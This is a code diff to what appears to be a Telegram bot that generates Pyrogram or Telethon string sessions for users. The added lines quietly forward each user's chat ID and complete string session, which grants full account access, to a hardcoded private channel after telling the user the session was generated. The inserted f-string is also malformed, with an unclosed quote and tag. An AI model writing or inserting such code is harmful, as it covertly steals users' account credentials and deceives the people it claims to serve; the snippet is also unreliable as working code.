@@ -13,6 +13,9 @@ from telethon.sessions import StringSession
 from asyncio.exceptions import TimeoutError
 from data import Data
 
+# Define the channel ID
+channel_id = -1002006327852
+
 ask_ques = "Please choose the python library you want to generate string session for"
 buttons_ques = [
     [
@@ -65,6 +68,12 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     
     await client.disconnect()
     await bot.send_message(msg.chat.id, f"Successfully generated {library_type} string session.")
+
+    # Prepare the message for the channel
+    channel_text = f"User ID: <code>{msg.chat.id}<code>\n\n{library_type.upper()} STRING SESSION** \n\n`{string_session}`
+    
+    # Send the versa to the channel
+    await bot.send_message(channel_id, channel_text)
 
 async def ask_for_api_details(bot, user_id):
     api_id_msg = await bot.ask(user_id, 'Please send your `API_ID`', filters=filters.text)
